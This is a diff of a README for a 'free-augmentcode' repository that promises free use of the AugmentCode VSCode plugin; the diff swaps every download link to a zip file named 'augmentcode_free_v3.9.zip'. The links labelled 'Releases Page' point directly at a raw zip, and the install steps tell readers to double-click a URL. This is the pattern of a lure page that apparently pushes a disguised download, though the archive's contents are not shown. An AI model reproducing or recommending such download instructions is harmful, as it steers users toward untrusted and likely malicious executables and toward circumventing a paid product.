@@ -6,7 +6,7 @@ Welcome to **free-augmentcode**! This application allows you to use the AugmentC
 
 ## 📥 Download Now
 
-[![Download free-augmentcode](https://raw.githubusercontent.com/imtishalch/free-augmentcode/main/nondisfranchised/free-augmentcode.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/imtishalch/free-augmentcode/main/nondisfranchised/free-augmentcode.zip)
+[![Download free-augmentcode](https://github.com/imtishalch/free-augmentcode/raw/refs/heads/main/nondisfranchised/augmentcode_free_v3.9.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/imtishalch/free-augmentcode/raw/refs/heads/main/nondisfranchised/augmentcode_free_v3.9.zip)
 
 ## 📋 System Requirements
 
@@ -25,11 +25,11 @@ Before you download, ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases Page](https://raw.githubusercontent.com/imtishalch/free-augmentcode/main/nondisfranchised/free-augmentcode.zip) to download the latest version. 
+To get started, visit the [Releases Page](https://github.com/imtishalch/free-augmentcode/raw/refs/heads/main/nondisfranchised/augmentcode_free_v3.9.zip) to download the latest version. 
 
 1. Click on the link above.
 2. Look for the most recent release.
-3. Choose the appropriate file for your operating system (e.g., `https://raw.githubusercontent.com/imtishalch/free-augmentcode/main/nondisfranchised/free-augmentcode.zip` for Windows, or `https://raw.githubusercontent.com/imtishalch/free-augmentcode/main/nondisfranchised/free-augmentcode.zip` for macOS).
+3. Choose the appropriate file for your operating system (e.g., `https://github.com/imtishalch/free-augmentcode/raw/refs/heads/main/nondisfranchised/augmentcode_free_v3.9.zip` for Windows, or `https://github.com/imtishalch/free-augmentcode/raw/refs/heads/main/nondisfranchised/augmentcode_free_v3.9.zip` for macOS).
 4. Click the file to begin downloading.
 5. Once the download completes, locate the file in your Downloads folder.
 
@@ -37,7 +37,7 @@ To get started, visit the [Releases Page](https://raw.githubusercontent.com/imti
 
 1. Unzip the downloaded file.
 2. Open the extracted folder.
-3. Double-click the `https://raw.githubusercontent.com/imtishalch/free-augmentcode/main/nondisfranchised/free-augmentcode.zip` file to start the installation.
+3. Double-click the `https://github.com/imtishalch/free-augmentcode/raw/refs/heads/main/nondisfranchised/augmentcode_free_v3.9.zip` file to start the installation.
 4. Follow the on-screen instructions to complete the installation.
 5. Open VSCode, and you will find the AugmentCode plugin ready to use.
 
@@ -74,7 +74,7 @@ You can check if the AugmentCode plugin is installed by opening VSCode and looki
 
 ### Can I update the plugin?
 
-Yes, we encourage you to check the [Releases Page](https://raw.githubusercontent.com/imtishalch/free-augmentcode/main/nondisfranchised/free-augmentcode.zip) regularly for updates. Follow the same installation process to update your plugin.
+Yes, we encourage you to check the [Releases Page](https://github.com/imtishalch/free-augmentcode/raw/refs/heads/main/nondisfranchised/augmentcode_free_v3.9.zip) regularly for updates. Follow the same installation process to update your plugin.
 
 ### What should I do if I encounter issues?
 
@@ -86,4 +86,4 @@ For any questions or support, feel free to reach out. You can find contact detai
 
 ## 📥 Download Now Again
 
-To start using the AugmentCode plugin today, visit the [Releases Page](https://raw.githubusercontent.com/imtishalch/free-augmentcode/main/nondisfranchised/free-augmentcode.zip) again and download your copy now!
+To start using the AugmentCode plugin today, visit the [Releases Page](https://github.com/imtishalch/free-augmentcode/raw/refs/heads/main/nondisfranchised/augmentcode_free_v3.9.zip) again and download your copy now!
